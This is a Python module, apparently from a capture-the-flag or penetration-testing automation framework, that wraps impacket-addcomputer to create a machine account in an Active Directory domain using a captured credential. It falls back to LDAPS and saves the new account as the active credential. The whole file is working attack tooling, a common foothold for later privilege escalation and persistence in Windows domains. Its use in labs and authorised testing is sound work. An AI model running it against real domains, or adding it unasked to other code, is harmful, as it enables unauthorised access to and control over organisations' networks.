import subprocess
import random
import string
import argparse

from core.target import target_add_cred


DEFAULT_NAME = "EVILWS01"
DEFAULT_PASS = "NewPass123!"


def random_name():
    return "EVILWS0" + str(random.randint(1, 9))


def run(data, cred, args):
    """
    Add machine account using impacket-addcomputer

    Usage:
        ctf ad.addcomputer
        ctf ad.addcomputer EVIL02 Password123!
    """

    

    # -------------------------
    # Parse arguments
    # -------------------------
    extra = getattr(args, "extra", []) or []

    name = extra[0] if len(extra) >= 1 else random_name()
    password = extra[1] if len(extra) >= 2 else DEFAULT_PASS

    # ensure trailing $
    if not name.endswith("$"):
        name += "$"

    # -------------------------
    # Resolve target info
    # -------------------------
    ip = data.get("ip")
    domain = data.get("domain")

    if not ip:
        print("[-] Target missing IP")
        return data

    if not domain:
        print("[-] No domain set")
        return data

    # -------------------------
    # Validate credential
    # -------------------------
    if not cred:
        print("[-] No active credential")
        return data

    username = cred.get("user")
    password_auth = cred.get("secret") if cred.get("type") == "password" else None

    if not username or not password_auth:
        print("[-] Need password-based credential")
        return data

    # -------------------------
    # Build base command
    # -------------------------
    base_cmd = [
        "impacket-addcomputer",
        f"{domain}/{username}:{password_auth}",
        "-dc-ip", ip,
        "-computer-name", name,
        "-computer-pass", password
    ]

    # -------------------------
    # Try LDAP first
    # -------------------------
    print(f"[*] Running: {' '.join(base_cmd)}")

    try:
        result = subprocess.run(
            base_cmd,
            capture_output=True,
            text=True
        )
    except Exception as e:
        print(f"[-] Execution failed: {e}")
        return data

    output = result.stdout + result.stderr

    # -------------------------
    # Success check
    # -------------------------
    if "added" in output.lower() or "success" in output.lower():
        print(f"[+] Machine account created: {name}")

    else:
        print("[*] LDAP failed, trying LDAPS...")

        # -------------------------
        # Retry with LDAPS
        # -------------------------
        cmd_ldaps = base_cmd + ["-method", "LDAPS"]

        print(f"[*] Running: {' '.join(cmd_ldaps)}")

        try:
            result = subprocess.run(
                cmd_ldaps,
                capture_output=True,
                text=True
            )
        except Exception as e:
            print(f"[-] Execution failed: {e}")
            return data

        output = result.stdout + result.stderr

        if "added" in output.lower() or "success" in output.lower():
            print(f"[+] Machine account created (LDAPS): {name}")
        else:
            print("[-] Failed to add computer")
            print(output)
            return data

    # -------------------------
    # Add credential (machine)
    # -------------------------
    target_add_cred(
        argparse.Namespace(
            user=name,
            password=password,
            hash=None,
            aes=None,
            ccache=None
        ),
        switch=True,
        show=True
    )


    return data